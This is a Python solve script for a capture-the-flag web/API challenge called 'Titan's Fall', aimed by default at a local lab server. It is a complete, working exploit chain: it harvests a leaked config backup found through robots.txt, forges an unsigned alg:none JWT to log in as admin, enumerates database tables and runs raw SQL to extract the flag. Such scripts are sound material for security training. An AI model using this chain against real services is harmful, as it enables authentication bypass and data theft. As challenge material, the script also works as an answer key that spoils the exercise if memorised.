#!/usr/bin/env python3
"""
Solve script for Project Kronos CTF Challenge
"Titan's Fall" - Web / API Exploitation

This script demonstrates the full exploit chain:
1. Discover the exposed Swagger docs
2. Find the leaked config backup via robots.txt
3. Extract JWT claim values from the config
4. Forge a JWT with alg:none bypass
5. Enumerate tables via the API
6. Execute a raw SQL query to extract the flag

Usage: python3 solve.py [TARGET_URL]
Default target: http://localhost:5000
"""

import sys
import json
import base64
import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"


def b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def forge_jwt(tid, aud, appid, upn):
    """Forge a JWT with alg:none (no signature verification)."""
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "tid": tid,
        "aud": aud,
        "appid": appid,
        "upn": upn
    }
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    # Empty signature section for alg:none
    return f"{h}.{p}."


def main():
    print(f"[*] Target: {TARGET}")
    print(f"{'='*60}")

    # Step 1: Check the frontend lockout
    print("\n[Step 1] Checking frontend...")
    r = requests.get(f"{TARGET}/")
    if "VPN" in r.text or "Access Denied" in r.text:
        print("  [+] Frontend is locked down (VPN required message)")
    else:
        print("  [-] Unexpected frontend response")

    # Step 2: Discover Swagger docs
    print("\n[Step 2] Looking for exposed API documentation...")
    r = requests.get(f"{TARGET}/swagger.json")
    if r.status_code == 200:
        swagger = r.json()
        paths = list(swagger.get('paths', {}).keys())
        print(f"  [+] Found swagger.json! Endpoints: {paths}")
    else:
        print("  [-] No swagger.json found")
        return

    # Step 3: Find the leaked config via robots.txt
    print("\n[Step 3] Checking robots.txt for information disclosure...")
    r = requests.get(f"{TARGET}/robots.txt")
    print(f"  [+] robots.txt contents:")
    for line in r.text.strip().split('\n'):
        if 'backup' in line.lower() or 'config' in line.lower() or 'TODO' in line or 'NOTE' in line:
            print(f"      >>> {line.strip()}")

    # Step 4: Download the leaked config
    print("\n[Step 4] Downloading leaked config backup...")
    r = requests.get(f"{TARGET}/backup/superset_config_2023.bak")
    if r.status_code == 200:
        config = r.text
        print("  [+] Config backup retrieved!")
        # Extract JWT values
        tid = aud = appid = None
        for line in config.split('\n'):
            line = line.strip()
            if line.startswith('tenant_id'):
                tid = line.split('=')[1].strip()
                print(f"  [+] Tenant ID: {tid}")
            elif line.startswith('audience'):
                aud = line.split('=')[1].strip()
                print(f"  [+] Audience: {aud}")
            elif line.startswith('application_id'):
                appid = line.split('=')[1].strip()
                print(f"  [+] App ID: {appid}")
            elif 'jwt_sig_verify' in line:
                print(f"  [!] CRITICAL: {line}")
            elif 'jwt_algorithms' in line:
                print(f"  [!] CRITICAL: {line}")
    else:
        print("  [-] Config backup not found")
        return

    # Step 5: Forge JWT with alg:none
    print("\n[Step 5] Forging JWT with alg:none bypass...")
    # First try with email-style UPN (should fail)
    token_email = forge_jwt(tid, aud, appid, "admin@kronos.internal")
    headers_email = {"Authorization": f"Bearer {token_email}"}
    r = requests.get(f"{TARGET}/v1/GetConfig", headers=headers_email)
    print(f"  [*] With upn='admin@kronos.internal': {r.json().get('error', 'OK')}")

    # Now with plain username 'admin'
    token = forge_jwt(tid, aud, appid, "admin")
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    r = requests.get(f"{TARGET}/v1/GetConfig", headers=headers)
    if r.status_code == 200:
        print(f"  [+] JWT forged successfully! Authenticated as admin.")
    else:
        print(f"  [-] Authentication failed: {r.json()}")
        return

    # Step 6: List tables
    print("\n[Step 6] Listing tables via CoreAnalytics routing target...")
    r = requests.get(f"{TARGET}/v1/GetTables?routingTarget=CoreAnalytics", headers=headers)
    if r.status_code == 200:
        tables = r.json().get('tables', [])
        print(f"  [+] Tables found: {tables}")
    else:
        print(f"  [-] Failed: {r.json()}")

    # Step 7: Query the flag_vault table
    print("\n[Step 7] Querying flag_vault table...")
    query_payload = {
        "routingTarget": "CoreAnalytics",
        "query": "SELECT * FROM flag_vault"
    }
    r = requests.post(f"{TARGET}/v2/Query", headers=headers, json=query_payload)
    if r.status_code == 200:
        data = r.json()
        results = data.get('results', [])
        if results:
            print(f"  [+] Query successful! {data.get('row_count')} row(s) returned.")
            for row in results:
                print(f"\n{'='*60}")
                print(f"  FLAG FOUND!")
                print(f"  Name: {row.get('flag_name')}")
                print(f"  Value: {row.get('flag_value')}")
                print(f"  Classification: {row.get('classification')}")
                print(f"{'='*60}")
        else:
            print("  [-] No results returned")
    else:
        print(f"  [-] Query failed: {r.json()}")


if __name__ == '__main__':
    main()
